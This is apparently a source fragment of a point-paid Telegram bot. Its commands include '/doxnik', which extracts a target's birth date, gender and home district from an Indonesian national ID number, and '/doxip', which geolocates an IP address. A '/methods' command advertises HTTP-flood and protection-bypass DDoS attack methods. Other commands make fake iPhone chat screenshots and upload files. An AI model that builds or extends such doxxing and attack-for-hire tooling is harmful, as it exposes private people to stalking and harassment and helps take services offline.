bot.onText(/^\/doxnik(?:\s+(\d+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = String(msg.from.id);
  const nikInput = match[1];
  const biaya = 5;

  if (!nikInput) {
    return bot.sendMessage(
      chatId,
      `📋 <b>Usage Example:</b>\n<code>/doxnik 16070xxxxxxxxxxxx</code>\n\n💡 Make sure you have the target's NIK first.`,
      { parse_mode: "HTML" }
    );
  }

  try {
    const nik = nikParser(nikInput);
    if (typeof nik.isValid === "function" && !nik.isValid()) {
      return bot.sendMessage(chatId, "❌ Invalid NIK.");
    }

    if (!consumePoint(userId, biaya)) {
      return bot.sendMessage(chatId, `❌ Your points are insufficient. ${biaya} points are required to use this feature.`);
    }

    const provinsi = nik.province();
    const kabupaten = nik.kabupatenKota();
    const kecamatan = nik.kecamatan();
    const mapsUrl = `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(
      `${kecamatan}, ${kabupaten}, ${provinsi}`
    )}`;

    const hasil = `
<code>🪪 NIK PARSING RESULT</code>
━━━━━━━━━━━━━━━━━━
<b>✅ NIK Valid:</b> ${typeof nik.isValid === "function" ? nik.isValid() : "N/A"}
<b>📍 Province ID:</b> ${typeof nik.provinceId === "function" ? nik.provinceId() : "N/A"}
<b>🏙️ Province Name:</b> ${provinsi || "N/A"}
<b>🏢 Regency ID:</b> ${typeof nik.kabupatenKotaId === "function" ? nik.kabupatenKotaId() : "N/A"}
<b>🏘️ Regency Name:</b> ${kabupaten || "N/A"}
<b>🗺️ District ID:</b> ${typeof nik.kecamatanId === "function" ? nik.kecamatanId() : "N/A"}
<b>🏠 District Name:</b> ${kecamatan || "N/A"}
<b>📫 Postal Code:</b> ${typeof nik.kodepos === "function" ? nik.kodepos() : "N/A"}
<b>🚻 Gender:</b> ${typeof nik.kelamin === "function" ? nik.kelamin() : "N/A"}
<b>🎂 Date of Birth:</b> ${typeof nik.lahir === "function" ? nik.lahir() : "N/A"}
<b>🧩 Uniqcode:</b> ${typeof nik.uniqcode === "function" ? nik.uniqcode() : "N/A"}
━━━━━━━━━━━━━━━━━━
📍 <a href="${mapsUrl}">View on Google Maps</a>
`.trim();

    await bot.sendMessage(chatId, hasil, {
      parse_mode: "HTML",
      disable_web_page_preview: false,
    });
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ An error occurred while processing the NIK. Points not deducted.");
  }
});

// === DOX IP ===
bot.onText(/^\/doxip\s+(.+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = String(msg.from.id);
  const ip = match[1].trim();
  const biaya = 4;

  try {
    const res = await fetch(`https://ipwho.is/${ip}`).then((r) => r.json()).catch(e => { throw e; });

    if (!res || !res.success) {
      console.error("ipwho.is response:", res);
      return bot.sendMessage(chatId, `❌ Error: Could not get data for IP ${ip}.`);
    }

    if (!consumePoint(userId, biaya)) {
      return bot.sendMessage(chatId, `❌ Your points are insufficient. ${biaya} points are required to use this feature.`);
    }

    const mapsUrl = `https://www.google.com/maps/search/?api=1&query=${res.latitude},${res.longitude}`;

    const info = `
<code>🌍 IP INFORMATION</code>
━━━━━━━━━━━━━━━━━━
<b>IP:</b> ${res.ip || "N/A"}
<b>Type:</b> ${res.type || "N/A"}
<b>Country:</b> ${res.country || "N/A"}
<b>Region:</b> ${res.region || "N/A"}
<b>City:</b> ${res.city || "N/A"}
<b>Latitude:</b> ${res.latitude}
<b>Longitude:</b> ${res.longitude}
<b>ISP:</b> ${res.connection?.isp || "N/A"}
<b>Org:</b> ${res.connection?.org || "N/A"}
<b>Domain:</b> ${res.connection?.domain || "N/A"}
<b>Timezone:</b> ${res.timezone?.id || "N/A"}
<b>Local Time:</b> ${res.timezone?.current_time || "N/A"}
<b>Flag:</b> ${res.flag?.emoji || "N/A"}
━━━━━━━━━━━━━━━━━━
📍 <a href="${mapsUrl}">View on Google Maps</a>
`.trim();

    try {
      if (res.latitude && res.longitude) {
        await bot.sendLocation(chatId, res.latitude, res.longitude);
      }
    } catch (locErr) {
      console.error("Failed to send location:", locErr);
    }

    await bot.sendMessage(chatId, info, { parse_mode: "HTML" });
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, `❌ Error: Could not get data for IP ${ip}. Points not deducted.`);
  }
});

// === Help if no argument (/doxip alone) ===
bot.onText(/^\/doxip$/i, async (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, "📌 <b>Example:</b> <code>/doxip 112.90.150.204</code>", {
    parse_mode: "HTML",
  });
});
bot.onText(/^\/bedrocarct(?:@[\w_]+)?/, async (msg) => {
  const senderId = msg.from.id;

  // Validate OWNER_ID
  if (!OWNER_ID) {
    return bot.sendMessage(senderId, "⚠️ OWNER_ID is not set in config.js!");
  }

  // Convert all to string to ensure match
  const isOwner = Array.isArray(OWNER_ID)
    ? OWNER_ID.map(id => String(id)).includes(String(senderId))
    : String(senderId) === String(OWNER_ID);

  // If not owner
  if (!isOwner) {
    return bot.sendMessage(senderId, "❌ Only OWNER can use this command.");
  }

  const reply = msg.reply_to_message;
  if (!reply) {
    return bot.sendMessage(senderId, "🔁 Reply to a text message, photo, video, or document you want to send, then use /bc");
  }

  const users = Object.keys(loadJSON(POINTS_FILE));
  if (users.length === 0)
    return bot.sendMessage(senderId, "⚠️ No users registered in the database.");

  const statusMsg = await bot.sendMessage(senderId, `📢 Starting broadcast to *${users.length}* users...`, { parse_mode: 'Markdown' });

  let sentCount = 0;
  let failedCount = 0;
  let idx = 0;

  for (const userId of users) {
    idx++;
    try {
      if (reply.text) {
        await bot.sendMessage(userId, reply.text, { parse_mode: "Markdown" });
      } else if (reply.photo) {
        const fileId = reply.photo[reply.photo.length - 1].file_id;
        const caption = reply.caption || '';
        await bot.sendPhoto(userId, fileId, { caption, parse_mode: "Markdown" });
      } else if (reply.document) {
        await bot.sendDocument(userId, reply.document.file_id, { caption: reply.caption || '' });
      } else if (reply.video) {
        await bot.sendVideo(userId, reply.video.file_id, { caption: reply.caption || '' });
      } else {
        const fallback = reply.caption || '📢 Broadcast (this message type is not fully supported).';
        await bot.sendMessage(userId, fallback);
      }
      sentCount++;
    } catch {
      failedCount++;
    }

    // Update progress every 20 users or at the end
    if (idx % 20 === 0 || idx === users.length) {
      try {
        await bot.editMessageText(
          `📢 Sending broadcast: ${idx}/${users.length}\n✅ Sent: ${sentCount}\n⚠️ Failed: ${failedCount}`,
          {
            chat_id: statusMsg.chat.id,
            message_id: statusMsg.message_id,
            parse_mode: 'Markdown'
          }
        );
      } catch {}
    }

    // delay 0.5 seconds to be safe from rate-limit
    await new Promise(res => setTimeout(res, 500));
  }

  await bot.sendMessage(senderId, `✅ Broadcast finished!\n\n📬 Sent: ${sentCount}\n⚠️ Failed: ${failedCount}`);
});
bot.onText(/^\/methods(?:@[\w_]+)?$/, async (msg) => {
  const chatId = msg.chat.id;

  const plain = `
👾 List of Layer 7 Methods:

- flood — HTTP(s) Flood DoS
- h2-flood — HTTP(s) h2-Flood DoS
- tls — TLS 1.3 / HTTPS-based methods
- strike — Best DDoS methods
- kill — Bypass CF / DDoS bypass methods
- raw — Huge RPS (raw HTTP request flex)
- bypass — High-power bypass methods
- thunder — Massive-power methods
- storm — The raining request (persistent HTTP flood)
- rape — Bypass protection
- destroy — Kill that socket
`.trim();

  const html = asHtmlBlockFromPlain(plain);

  // Send as HTML. disable_web_page_preview to prevent preview if there are URLs.
  bot.sendMessage(chatId, html, { parse_mode: "HTML", disable_web_page_preview: true });
});
// /iqc command
bot.onText(/^\/iqc(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1];

  if (!input) {
    return bot.sendMessage(chatId,
      "❌ Invalid format.\n\nUsage example:\n`/iqc Text| 00:55 | 55 | INDOSAT`",
      { parse_mode: "Markdown" }
    );
  }

  const parts = input.split("|").map(p => p.trim());
  const text = parts[0];
  const time = parts[1] || "12:12";
  const battery = parts[2] || "17";
  const carrier = parts[3] || "INDOSAT OREDOO";

  const apiUrl = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&messageText=${encodeURIComponent(text)}&carrierName=${encodeURIComponent(carrier)}&batteryPercentage=${encodeURIComponent(battery)}&signalStrength=4&emojiStyle=apple`;

  try {
    await bot.sendChatAction(chatId, "upload_photo");

    const response = await axios.get(apiUrl, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data, "binary");

    await bot.sendPhoto(chatId, buffer, {
      caption: `🪄 *iPhone Quoted Generator ?*
      
💬 \`${text}\`
🕒 ${time} | 🔋 ${battery}% | 📡 ${carrier}`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⌈ DEVELϴPER ⌋", url: "@Dark_is_the_nigth" }]
        ]
      }
    });
  } catch (err) {
    console.error(err.message);
    bot.sendMessage(chatId, "❌ An error occurred while processing the image.");
  }
});

// /brat command
bot.onText(/^\/brat(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const argsRaw = match[1];

  if (!argsRaw) {
    return bot.sendMessage(chatId,
      "❌ Invalid format.\n\nUsage example:\n`/brat Hello World`",
      { parse_mode: "Markdown" }
    );
  }

  try {
    const text = argsRaw.trim();
    if (!text) {
      return bot.sendMessage(chatId, '❌ Text cannot be empty!', { parse_mode: "Markdown" });
    }

    const delay = 500; // default delay
    const isAnimated = false; // default GIF animation

    await bot.sendMessage(chatId, '🌿 Generating brat sticker...');

    const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isAnimated=${isAnimated}&delay=${delay}`;
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });

    const buffer = Buffer.from(response.data);

    await bot.sendSticker(chatId, buffer);
  } catch (error) {
    console.error('❌ Error brat:', error.message);
    bot.sendMessage(chatId, '❌ Failed to create brat sticker. Please try again later!');
  }
});
const saveDir = path.join(__dirname, "downloads");
if (!fs.existsSync(saveDir)) fs.mkdirSync(saveDir);

// === FUNCTION TO UPLOAD TO CATBOX ===
async function uploadToCatbox(filePath) {
  const form = new FormData();
  form.append("reqtype", "fileupload");
  form.append("fileToUpload", fs.createReadStream(filePath));

  const res = await axios({
    method: "post",
    url: "https://catbox.moe/user/api.php",
    data: form,
    headers: form.getHeaders(),
    timeout: 60000,
  });

  if (typeof res.data === "string" && res.data.startsWith("http")) {
    return res.data.trim();
  }
  throw new Error("Catbox upload failed");
}

// === COMMAND /tourl ===
bot.onText(/\/tourl/, async (msg) => {
  const chatId = msg.chat.id;
  const reply = msg.reply_to_message;

  if (!reply || (!reply.photo && !reply.video))
    return bot.sendMessage(chatId, "❌ Reply to a photo or video with /tourl");

  const fileId = reply.photo
    ? reply.photo[reply.photo.length - 1].file_id
    : reply.video.file_id;
  const fileType = reply.photo ? ".jpg" : ".mp4";

  try {
    const file = await bot.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${TELEGRAM_TOKEN}/${file.file_path}`;
    const fileName = `file_${Date.now()}${fileType}`;
    const savePath = path.join(saveDir, fileName);

    // === DOWNLOAD FILE FROM TELEGRAM ===
    await new Promise((resolve, reject) => {
      const stream = fs.createWriteStream(savePath);
      https
        .get(fileUrl, (res) => {
          if (res.statusCode !== 200)
            return reject(new Error("Failed to download file"));
          res.pipe(stream);
          stream.on("finish", () => stream.close(resolve));
        })
        .on("error", reject);
    });

    // === UPLOAD TO CATBOX ===
    bot.sendMessage(chatId, "⏳ Uploading to Catbox, please wait...");
    const url = await uploadToCatbox(savePath);

    // === SEND RESULT ===
    bot.sendMessage(
      chatId,
      `✅ Successfully uploaded to Catbox\n🔗 URL: ${url}\n📁 Saved to: ${savePath}`
    );
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Failed to download or upload file.");
  }
});